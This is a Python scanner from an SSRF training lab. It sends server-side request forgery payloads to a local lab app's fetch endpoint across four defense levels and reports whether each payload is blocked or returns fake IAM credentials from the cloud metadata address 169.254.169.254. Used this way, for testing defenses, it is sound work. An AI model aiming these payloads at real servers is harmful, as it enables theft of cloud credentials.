#!/usr/bin/env python3
"""
SSRF Lab — level scanner (toolkit)
==================================
LAB-ONLY. Fires a fixed set of SSRF payloads at OUR OWN lab app's /fetch
endpoint across defense levels L0–L3 and reports, per payload and level,
whether it was BLOCKED, merely FETCHED, or returned the fake credentials
(LOOT). Reproduces the full comparison table with one command.

It talks ONLY to the app you point it at (default http://localhost:8088), which
must be a lab instance you are running. Uses the standard library only.

Usage:
    python toolkit/ssrf_scan.py                 # matrix across L0..L3
    python toolkit/ssrf_scan.py --level 3       # just one level
    python toolkit/ssrf_scan.py --base http://localhost:8088
"""
from __future__ import annotations

import argparse
import html as htmllib
import re
import urllib.parse
import urllib.request

from ssrf_payloads import build_urls  # same-folder helper

BLOCK_RE = re.compile(r'<div class="blocked">.*?</b>\s*(.*?)</div>', re.S)
ERR_RE = re.compile(r'<div class="error">.*?</b>\s*(.*?)</div>', re.S)
PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)

CREDS_PATH = "/latest/meta-data/iam/security-credentials/lab-ec2-demo-role"


def payloads(ip: str):
    """(label, url) pairs: the IP encodings plus the redirect/DNS/legit cases."""
    tests = [(name, url) for name, url in build_urls(ip, CREDS_PATH).items()]
    tests += [
        ("302-redirect", "http://preview-service.lab/"),
        ("dns-innocent", f"http://cdn-assets.lab{CREDS_PATH}"),
        ("legit-example", "http://example.com/"),
    ]
    return tests


def classify(body: str) -> str:
    m = BLOCK_RE.search(body)
    if m:
        return "BLOCKED"
    m = PRE_RE.search(body)
    if m:
        text = htmllib.unescape(m.group(1))
        return "LOOT" if '"AccessKeyId"' in text else "FETCHED"
    if ERR_RE.search(body):
        return "ERROR"
    return "???"


def probe(base: str, level: int, url: str, timeout: int = 12) -> str:
    query = urllib.parse.urlencode({"level": level, "url": url})
    try:
        with urllib.request.urlopen(f"{base}/fetch?{query}", timeout=timeout) as resp:
            return classify(resp.read().decode("utf-8", "replace"))
    except Exception as exc:  # noqa: BLE001 — report any transport error compactly
        return f"REQ-ERR"


def main() -> None:
    parser = argparse.ArgumentParser(description="Scan the LAB app across SSRF defense levels.")
    parser.add_argument("--base", default="http://localhost:8088", help="lab app base URL")
    parser.add_argument("--ip", default="169.254.169.254", help="target metadata IP")
    parser.add_argument("--level", type=int, choices=[0, 1, 2, 3], help="single level (default: all)")
    args = parser.parse_args()

    levels = [args.level] if args.level is not None else [0, 1, 2, 3]
    tests = payloads(args.ip)
    width = max(len(name) for name, _ in tests)

    print(f"# SSRF Lab scan against {args.base}  (LAB-ONLY)")
    header = "payload".ljust(width) + "  " + "".join(f"L{l:<8}" for l in levels)
    print(header)
    print("-" * len(header))
    for name, url in tests:
        row = name.ljust(width) + "  "
        for lvl in levels:
            row += probe(args.base, lvl, url).ljust(9)
        print(row)
    print("\nLOOT = fake credentials returned · BLOCKED = filter refused · "
          "FETCHED = fetched non-creds · ERROR = fetch failed")


if __name__ == "__main__":
    main()
